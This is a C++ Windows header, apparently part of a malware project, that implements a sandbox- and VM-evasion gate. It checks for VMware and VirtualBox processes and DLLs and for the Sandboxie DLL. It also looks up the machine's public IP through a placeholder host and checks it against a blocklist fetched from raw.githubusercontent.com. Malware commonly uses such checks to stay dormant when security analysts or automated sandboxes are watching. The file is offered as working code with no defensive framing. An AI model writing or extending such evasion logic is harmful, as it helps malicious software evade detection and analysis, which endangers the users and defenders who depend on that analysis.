// language: C++, file: src/gate.h
#pragma once
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <string>
#include <vector>
#pragma comment(lib, "wininet.lib")

namespace gate {

    inline bool proc_running(const wchar_t* name) {
        HANDLE s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (s == INVALID_HANDLE_VALUE) return false;
        PROCESSENTRY32W e = { sizeof(e) };
        bool found = false;
        if (Process32FirstW(s, &e)) {
            do {
                if (!_wcsicmp(e.szExeFile, name)) { found = true; break; }
            } while (Process32NextW(s, &e));
        }
        CloseHandle(s);
        return found;
    }

    inline bool file_exists(const wchar_t* path) {
        return GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES;
    }

    inline bool http_get(const wchar_t* host, const wchar_t* path, std::string& out) {
        HINTERNET net = InternetOpenW(L"WinInet", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
        if (!net) return false;
        HINTERNET conn = InternetConnectW(net, host, INTERNET_DEFAULT_HTTPS_PORT,
                                          nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
        if (!conn) { InternetCloseHandle(net); return false; }
        DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
        HINTERNET req = HttpOpenRequestW(conn, L"GET", path, nullptr, nullptr, nullptr, flags, 0);
        if (!req) { InternetCloseHandle(conn); InternetCloseHandle(net); return false; }
        if (!HttpSendRequestW(req, nullptr, 0, nullptr, 0)) {
            InternetCloseHandle(req); InternetCloseHandle(conn); InternetCloseHandle(net);
            return false;
        }
        char buf[1024];
        DWORD read = 0;
        while (InternetReadFile(req, buf, sizeof(buf), &read) && read > 0) {
            out.append(buf, read);
        }
        InternetCloseHandle(req);
        InternetCloseHandle(conn);
        InternetCloseHandle(net);
        return true;
    }

    inline bool blocked(const wchar_t* ip) {
        std::string body;
        wchar_t host[] = L"raw.githubusercontent.com";
        if (!http_get(host, L"/<owner>/<repo>/main/ips.txt", body)) return false;
        std::wstring w(ip);
        std::string needle(w.begin(), w.end());
        return body.find(needle) != std::string::npos;
    }

    inline bool tripped() {
        // hardware / VM gate
        if (proc_running(L"vmware.exe")) return true;
        if (proc_running(L"vmwaretray.exe")) return true;
        if (proc_running(L"vboxservice.exe")) return true;
        if (proc_running(L"vmsrvc.exe")) return true;
        if (file_exists(L"C:\\Windows\\System32\\vmGuestLib.dll")) return true;
        if (file_exists(L"C:\\Windows\\vboxmrxnp.dll")) return true;
        if (GetModuleHandleW(L"SbieDll.dll")) return true;
        if (GetModuleHandleW(L"sbiedll.dll")) return true;
        // network gate (fails soft)
        wchar_t host[256] = {};
        DWORD n = 256;
        if (GetComputerNameW(host, &n)) {
            std::string body;
            if (http_get(L"<gate>", L"/ip", body)) {
                std::wstring w(body.begin(), body.end());
                while (!w.empty() && (w.back() == '\r' || w.back() == '\n')) w.pop_back();
                if (blocked(w.c_str())) return true;
            }
        }
        return false;
    }
}
